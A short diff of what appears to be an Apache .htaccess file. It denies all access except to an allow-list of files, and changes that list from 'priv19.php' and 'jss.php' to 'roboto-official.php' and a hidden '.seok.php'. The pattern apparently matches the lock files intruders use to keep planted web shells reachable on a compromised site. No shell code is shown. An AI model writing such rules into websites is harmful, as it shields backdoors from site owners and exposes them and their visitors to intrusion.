@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(index.html|index.php|priv19.php|jss.php)$">
+<FilesMatch "^(index.html|index.php|roboto-official.php|.seok.php)$">
 
 Order allow,deny
 
